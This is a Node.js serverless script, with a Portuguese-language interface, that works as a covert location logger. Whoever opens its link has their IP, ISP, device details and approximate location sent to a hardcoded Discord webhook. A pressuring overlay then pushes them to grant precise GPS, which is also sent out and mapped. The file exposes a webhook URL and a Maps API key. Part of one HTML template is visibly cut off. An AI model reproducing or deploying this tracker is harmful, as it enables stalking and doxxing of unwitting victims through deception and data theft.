// Location Logger - Improved Version with Maps Integration
const https = require('https');
const http = require('http');
const url = require('url');

// Configuration
const config = {
  "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
  "username": "Location Tracker",
  "color": 0xFF3E4D,
  "accurateLocation": true
};

// Enhanced function to get detailed IP information
async function getIPInfo(ip) {
  return new Promise((resolve, reject) => {
    // Using an alternative API that works better with IPv6 and mobile networks
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    
    http.get(apiUrl, (res) => {
      let data = '';
      res.on('data', (chunk) => { 
        data += chunk; 
      });
      
      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          console.log('IP API Response:', parsedData);
          
          // Check if the API returned success
          if (parsedData.status === 'success') {
            resolve(parsedData);
          } else {
            console.error('API returned non-success status:', parsedData);
            // Still resolve with the data we have
            resolve(parsedData);
          }
        } catch (e) {
          console.error('Error parsing IP API response:', e);
          console.error('Received data:', data);
          // Resolve with an empty object to avoid formatting errors
          resolve({});
        }
      });
    }).on('error', (error) => {
      console.error('Error requesting IP API:', error);
      // Resolve with an empty object to avoid formatting errors
      resolve({});
    });
  });
}

// Function to send webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Prepare data
      const webhookData = JSON.stringify(data);
      
      // Parse webhook URL to get hostname and path
      const webhookUrl = new URL(config.webhook);
      
      // Configure request
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      console.log('Sending to webhook:', options.hostname, options.path);
      
      // Create request
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Collect response data
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // When response is complete
        res.on('end', () => {
          // Check status code
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook sent successfully');
            resolve(true);
          } else {
            console.error(`Error sending webhook: Status ${res.statusCode}`);
            console.error(`Response: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Handle request errors
      req.on('error', (error) => {
        console.error('Error in webhook request:', error);
        reject(error);
      });
      
      // Send data
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Error sending webhook:', error);
      reject(error);
    }
  });
}

// Detect if device is iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Function to format complete Discord message with detailed IP info
function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
  // Detect OS and browser
  let os = "Unknown";
  let browser = "Unknown";
  
  if (userAgent) {
    // Operating system
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    // Browser
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      browser = "Opera";
    }
  }

  // Format coordinates
  let coordsText = 'Unknown';
  let coordsSource = 'Approximate';
  let mapsLink = '';
  
  if (coords) {
    coordsText = coords.replace(',', ', ');
    coordsSource = `Precise`;
    mapsLink = `https://www.google.com/maps/search/google+map++${coords}`;
  } else if (info && info.lat && info.lon) {
    coordsText = `${info.lat}, ${info.lon}`;
    coordsSource = `Approximate`;
    mapsLink = `https://www.google.com/maps/search/google+map++${info.lat},${info.lon}`;
  }

  // Format timezone
  let timezoneText = 'Unknown';
  if (info && info.timezone) {
    const parts = info.timezone.split('/');
    if (parts.length >= 2) {
      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
    } else {
      timezoneText = info.timezone;
    }
  }

  // Check if bot
  let botStatus = 'False';
  if (info && info.hosting) {
    botStatus = 'Possibly';
  }
  if (info && info.proxy) {
    botStatus = 'Likely';
  }

  // Extract ASN from "as" field
  let asn = 'Unknown';
  if (info && info.as) {
    asn = info.as;
  }

  let content = coords ? "@everyone **LOCALIZAÇÃO EXATA CAPTURADA**" : "";

  return {
    username: config.username,
    content: content,
    embeds: [
      {
        title: `${coords ? "🎯 LOCALIZAÇÃO PRECISA CAPTURADA!" : "🔍 Acesso Detectado - Aguardando GPS"}`,
        color: config.color,
        description: `**Informações do Dispositivo**
> **IP:** \`${ip || 'Unknown'}\`
> **Sistema:** \`${os}\`
> **Navegador:** \`${browser}\`

**Localização:**
> **Coordenadas:** \`${coordsText}\` (${coordsSource})
> **Mapa:** ${mapsLink ? `[Ver no Google Maps](${mapsLink})` : 'Não disponível'}
> **País:** \`${info && info.country ? info.country : 'Unknown'}\`
> **Região:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
> **Cidade:** \`${info && info.city ? info.city : 'Unknown'}\`
> **Operadora:** \`${info && info.isp ? info.isp : 'Unknown'}\`
> **ASN:** \`${asn}\`
> **Timezone:** \`${timezoneText}\`

**Status de Segurança:**
> **Rede Móvel:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
> **VPN/Proxy:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
> **Bot/DC:** \`${botStatus}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\`

**Endpoint:** \`${endpoint || 'N/A'}\``
      }
    ]
  };
}

// Main function
module.exports = async (req, res) => {
  try {
    // Get URL parameters
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Check if we already have location coordinates
    
    // Get IP and User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log('Request received from IP:', ip);
    console.log('User Agent:', userAgent);
    
    // Check if it's iOS for special handling
    const deviceIsIOS = isIOS(userAgent);
    
    // Check if IP is from Discord (starts with 35)
    const isDiscord = ip.startsWith('35');
    
    // If we have geolocation parameter, send to Discord
    if (geoParam) {
      try {
        // Decode coordinates
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        console.log('Coordinates received:', latitude, longitude);
        
        // Get detailed IP information
        console.log('Getting IP information...');
        const ipInfo = await getIPInfo(ip);
        console.log('IP information obtained:', ipInfo);
        
        // Format the complete message
        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
        
        // Send webhook to Discord with coordinates
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Location Logger - Precise Location Captured",
              color: config.color,
              description: description
            }
          ]
        };
        
        console.log('Sending webhook to Discord...');
        await sendDiscordWebhook(data);
        
        // Send page with the Google Maps view
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Location Map</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: Arial, sans-serif;
                background-color: #f5f5f5;
              }
              .container {
                display: flex;
                flex-direction: column;
                height: 100vh;
                padding: 20px;
                box-sizing: border-box;
              }
              .map-container {
                flex: 1;
                border-radius: 8px;
                overflow: hidden;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 20px;
              }
              iframe {
                width: 100%;
                height: 100%;
                border: none;
              }
              .info {
                background: white;
                padding: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
              }
              h1 {
                margin-top: 0;
                font-size: 1.5rem;
                color: #333;
              }
              p {
                color: #666;
                line-height: 1.5;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="map-container">
                <iframe
                  src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${latitude},${longitude}&zoom=15"
                  allowfullscreen>
                </iframe>
              </div>
              <div class="info">
                <h1>Localização encontrada</h1>
                <p>Suas coordenadas foram detectadas com sucesso. Esta é a sua localização aproximada no mapa.</p>
                <p>Latitude: ${latitude}, Longitude: ${longitude}</p>
              </div>
            </div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Error processing geolocation:', error);
        // Continue even with geolocation error
      }
    } else if (isDiscord) {
      // If it's Discord accessing, send link alert
      console.log("Discord access detected. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "🔗 Link Enviado no Discord",
            color: config.color,
            description: `Um link de rastreamento foi enviado em um chat!\nVocê pode receber dados de localização em breve.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // For Discord, send a blank response
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // If we don't have geolocation yet, request it from the browser
      
      // First, get IP information and send basic report
      console.log('Getting basic IP information...');
      const ipInfo = await getIPInfo(ip);
      console.log('Basic IP information obtained:', ipInfo);
      
      // Format the basic message
      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      console.log('Sending initial report to Discord...');
      await sendDiscordWebhook(data);
      
      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização imediatamente
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Carregando...</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              font-family: Arial, sans-serif;
              background-color: #f8f8f8;
              overflow: hidden;
            }
            #overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(0,0,0,0.8);
              z-index: 999;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              padding: 20px;
              box-sizing: border-box;
              color: white;
              text-align: center;
            }
            .modal {
              background-color: #fff;
              border-radius: 12px;
              padding: 30px;
              max-width: 450px;
              width: 90%;
              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
              text-align: center;
              color: #333;
            }
            .title {
              font-size: 22px;
              font-weight: bold;
              margin-bottom: 20px;
              color: #e53935;
            }
            .message {
              font-size: 16px;
              line-height: 1.6;
              margin-bottom: 25px;
            }
            .button {
              background-color: #e53935;
              color: white;
              border: none;
              border-radius: 30px;
              padding: 15px 30px;
              font-size: 16px;
              font-weight: bold;
              cursor: pointer;
              transition: all 0.2s;
              display: inline-block;
            }
            .button:hover {
              background-color: #c62828;
              transform: scale(1.05);
            }
            .icon {
              width: 80px;
              height: 80px;
              margin-bottom: 20px;
              animation: pulse 2s infinite;
            }
            @keyframes pulse {
              0% { transform: scale(1); }
              50% { transform: scale(1.1); }
              100% { transform: scale(1); }
            }
            .loading {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(255,255,255,0.95);
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              z-index: 1000;
            }
            .spinner {
              border: 5px solid rgba(0,0,0,0.1);
              border-radius: 50%;
              border-top: 5px solid #e53935;
              width: 60px;
              height: 60px;
              margin-bottom: 20px;
              animation: spin 1s linear infinite;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            .retry-container {
              display: none;
              text-align: center;
              background-color: #fff;
              padding: 30px;
              border-radius: 12px;
              max-width: 450px;
              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            }
            .error-icon {
              color: #e53935;
              font-size: 50px;
              margin-bottom: 20px;
            }
            .error-title {
              font-size: 22px;
              color: #e53935;
              margin-bottom: 15px;
            }
          </style>
        </head>
        <body>
          <!-- Página de fundo (nunca visível) -->
          <div style="display: none;">Carregando...</div>
          
          <!-- Overlay principal -->
          <div id="overlay">
            <div class="modal">
              <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#e53935">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
              </svg>
              <div class="title">ATENÇÃO</div>
              <div class="message">
                É necessário ativar sua localização para continuar. 
                Este serviço requer acesso à sua posição atual.
              </div>
              <button id="allowLocationBtn" class="button">Permitir Localização</button>
            </div>
          </div>
          
          <!-- Tela de carregamento (inicialmente oculta) -->
          <div id="loadingScreen" class="loading" style="display: none;">
            <div class="spinner"></div>
            <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Obtendo Localização</div>
            <div style="color: #666;">Por favor, aguarde...</div>
          </div>
          
          <!-- Tela de erro/retry (inicialmente oculta) -->
          <div id="retryScreen" class="loading" style="display: none;">
            <div class="retry-container">
              <div class="error-icon">⚠️</div>
              <div class="error-title">Acesso Negado</div>
              <div style="margin-bottom: 20px; color: #666; line-height: 1.5;">
                O acesso à sua localização foi negado. Para continuar, é necessário permitir o acesso à sua localização.
              </div>
              <button onclick="showPermissionInstructions()" class="button" style="background-color: #4285F4; margin-right: 10px;">Como Permitir</button>
              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
            </div>
          </div>
          
          <!-- Tela de instruções (inicialmente oculta) -->
          <div id="instructionsScreen" class="loading" style="display: none;">
            <div class="retry-container" style="max-width: 500px;">
              <div style="text-align: right; margin-bottom: 10px;">
                <button onclick="hideInstructions()" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
              </div>
              <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Como Permitir Acesso à Localização</div>
              
              <div id="chromeInstructions" style="text-align: left; display: none;">
                <p><strong>No Chrome:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado/informação na barra de endereço</li>
                  <li>Clique em "Permissões do site"</li>
                  <li>Encontre "Localização" e selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="safariInstructions" style="text-align: left; display: none;">
                <p><strong>No Safari:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Abra Ajustes no seu iPhone/iPad</li>
                  <li>Role para baixo e toque em "Safari"</li>
                  <li>Toque em "Permissões de Sites"</li>
                  <li>Toque em "Localização" e selecione "Permitir"</li>
                  <li>Volte ao Safari e recarregue a página</li>
                </ol>
              </div>
              
              <div id="firefoxInstructions" style="text-align: left; display: none;">
                <p><strong>No Firefox:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado na barra de endereço</li>
                  <li>Clique em "Permissões"</li>
                  <li>Em "Acessar Sua Localização", selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="edgeInstructions" style="text-align: left; display: none;">
                <p><strong>No Edge:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Clique no ícone de cadeado na barra de endereço</li>
                  <li>Clique em "Permissões do site"</li>
                  <li>Em "Localização", selecione "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <div id="genericInstructions" style="text-align: left; display: none;">
                <p><strong>Instruções Gerais:</strong></p>
                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
                  <li>Procure pelo ícone de cadeado ou permissões na barra de endereço</li>
                  <li>Procure por configurações de "Localização" ou "Permissões do site"</li>
                  <li>Altere a configuração para "Permitir"</li>
                  <li>Recarregue a página</li>
                </ol>
              </div>
              
              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
            </div>
          </div>

          <script>
            // Solicitar localização automaticamente quando a página carrega
            document.addEventListener('DOMContentLoaded', function() {
              // Forçamos solicitação após um pequeno delay para garantir que a interface carregue primeiro
              setTimeout(function() {
                // Tentar obter localização automaticamente após 1 segundo
                requestLocation();
              }, 500);
            });

            // Referências aos elementos da interface
            const overlay = document.getElementById('overlay');
            const loadingScreen = document.getElementById('loadingScreen');
            const retryScreen = document.getElementById('retryScreen');
            const instructionsScreen = document.getElementById('instructionsScreen');
            const allowLocationBtn = document.getElementById('allowLocationBtn');

            // Botão para permitir localização
            allowLocationBtn.addEventListener('click', function() {
              requestLocation();
            });

            // Função para solicitar localização
            function requestLocation() {
              // Esconde overlay e mostra tela de carregamento
              overlay.style.display = 'none';
              loadingScreen.style.display = 'flex';
              
              if (navigator.geolocation) {
                // Tenta obter localização com alta precisão e sem cache
                navigator.geolocation.getCurrentPosition(
                  // Sucesso
                  function(position) {
                    // Temos a posição
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const coords = lat + "," + lng;
                    
                    // Codifica em base64
                    const encodedCoords = btoa(coords);
                    
                    // Constrói nova URL
                    const currentUrl = window.location.href;
                    let newUrl;
                    if (currentUrl.includes("?")) {
                      newUrl = currentUrl + "&g=" + encodedCoords;
                    } else {
                      newUrl = currentUrl + "?g=" + encodedCoords;
                    }
                    
                    // Redireciona
                    window.location.replace(newUrl);
                  },
                  // Erro
                  function(error) {
                    console.error("Erro de geolocalização:", error.message);
                    loadingScreen.style.display = 'none';
                    retryScreen.style.display = 'flex';
                  },
                  // Opções
                  {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                  }
                );
              } else {
                alert("Seu navegador não suporta geolocalização. Por favor, use um navegador mais recente.");
                loadingScreen.style.display = 'none';
                overlay.style.display = 'flex';
              }
            }

            // Função para tentar novamente
            function retryLocation() {
              retryScreen.style.display = 'none';
              instructionsScreen.style.display = 'none';
              requestLocation();
            }

            // Função para mostrar instruções de permissão
            function showPermissionInstructions() {
              retryScreen.style.display = 'none';
              instructionsScreen.style.display = 'flex';
              
              // Determina qual navegador está sendo usado
              const ua = navigator.userAgent;
              const chromeInst = document.getElementById('chromeInstructions');
              const safariInst = document.getElementById('safariInstructions');
              const firefoxInst = document.getElementById('firefoxInstructions');
              const edgeInst = document.getElementById('edgeInstructions');
              const genericInst = document.getElementById('genericInstructions');
              
              // Esconde todas as instruções primeiro
              chromeInst.style.display = 'none';
              safariInst.style.display = 'none';
              firefoxInst.style.display = 'none';
              edgeInst.style.display = 'none';
              
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    } else {
      // Geolocation not enabled, send basic report
      console.log('Getting basic IP information (without geolocation)...');
      const ipInfo = await getIPInfo(ip);
      console.log('Basic IP information obtained:', ipInfo);
      
      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      console.log('Sending report to Discord...');
      await sendDiscordWebhook(data);
      
      // Send simple page with location request
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Serviço de Localização</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              font-family: Arial, sans-serif;
              background-color: #f5f5f5;
            }
            .container {
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              height: 100vh;
              padding: 20px;
              box-sizing: border-box;
              text-align: center;
            }
            .location-box {
              background-color: white;
              border-radius: 8px;
              padding: 30px;
              max-width: 500px;
              width: 100%;
              box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            }
            h1 {
              color: #333;
              margin-top: 0;
              margin-bottom: 20px;
            }
            p {
              color: #666;
              line-height: 1.6;
              margin-bottom: 25px;
            }
            .button {
              background-color: #4285F4;
              color: white;
              border: none;
              border-radius: 4px;
              padding: 12px 24px;
              font-size: 16px;
              cursor: pointer;
              transition: background-color 0.3s;
            }
            .button:hover {
              background-color: #3367D6;
            }
            .location-icon {
              display: block;
              width: 80px;
              height: 80px;
              margin: 0 auto 20px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="location-box">
              <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4285F4">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
              </svg>
              <h1>Serviço de Localização</h1>
              <p>Para continuar, precisamos acessar sua localização atual. Isso nos permite mostrar informações relevantes com base na sua posição geográfica.</p>
              <button id="getLocationBtn" class="button">Compartilhar minha localização</button>
            </div>
          </div>
          
          <script>
            document.getElementById('getLocationBtn').addEventListener('click', function() {
              if (navigator.geolocation) {
                this.innerHTML = "Obtendo localização...";
                this.disabled = true;
                
                navigator.geolocation.getCurrentPosition(
                  function(position) {
                    // Success - we have the position
                    var lat = position.coords.latitude;
                    var lng = position.coords.longitude;
                    var coords = lat + "," + lng;
                    
                    // Encode in base64
                    var encodedCoords = btoa(coords);
                    
                    // Build new URL
                    var currentUrl = window.location.href;
                    var newUrl;
                    if (currentUrl.includes("?")) {
                      newUrl = currentUrl + "&g=" + encodedCoords;
                    } else {
                      newUrl = currentUrl + "?g=" + encodedCoords;
                    }
                    
                    // Redirect
                    window.location.replace(newUrl);
                  },
                  function(error) {
                    // Error getting location
                    var button = document.getElementById('getLocationBtn');
                    button.innerHTML = "Tentar novamente";
                    button.disabled = false;
                    
                    alert("Erro ao acessar sua localização. Por favor, verifique as permissões do seu navegador e tente novamente.");
                  },
                  {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                  }
                );
              } else {
                alert("Seu navegador não suporta serviços de geolocalização. Por favor, use um navegador mais recente.");
              }
            });
          </script>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    }
  } catch (error) {
    console.error('Error:', error);
    
    // In case of error, send a basic page
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Serviço de Localização</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body, html {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            text-align: center;
            padding: 20px;
          }
          .error-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
          }
          h1 {
            color: #d32f2f;
            margin-top: 0;
          }
          p {
            color: #666;
            line-height: 1.6;
          }
          button {
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            margin-top: 20px;
            font-size: 16px;
            cursor: pointer;
          }
        </style>
      </head>
      <body>
        <div class="error-container">
          <h1>Erro no serviço</h1>
          <p>Houve um problema ao carregar o serviço de localização. Por favor, tente novamente mais tarde.</p>
          <button onclick="window.location.reload()">Tentar novamente</button>
        </div>
      </body>
      </html>
    `);
  }
};
